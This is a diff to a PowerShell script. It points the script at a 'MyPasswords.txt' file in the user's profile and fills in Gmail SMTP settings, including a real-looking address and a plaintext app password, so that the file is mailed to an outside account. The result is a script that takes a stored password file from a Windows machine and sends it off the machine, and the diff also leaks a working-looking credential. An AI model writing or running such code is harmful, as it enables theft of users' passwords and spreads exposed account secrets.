@@ -1,6 +1,6 @@
 $ErrorActionPreference = "Stop"
 
-$File = "C:\Output.txt"
+$File = Join-Path $env:USERPROFILE "MyPasswords.txt"
 $Log = "C:\mail_log.txt"
 
 "==== START $(Get-Date) ====" | Out-File $Log -Append
@@ -14,13 +14,13 @@ try {
     $smtpServer = "smtp.gmail.com"
     $smtpPort = 587
 
-    $from = "@@gmail.com"
-    $to = "@@gmail.com"
+    $from = "parker1202002@gmail.com"
+    $to = "parker1202002@gmail.com"
     $subject = "TXT file"
     $body = "Файл во вложении."
 
-    $username = "@@gmail.com"
-    $password = "@"
+    $username = "parker1202002@gmail.com"
+    $password = "nawlbpytdnjqwvxm"
 
     $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
     $credential = New-Object System.Management.Automation.PSCredential($username, $securePassword)
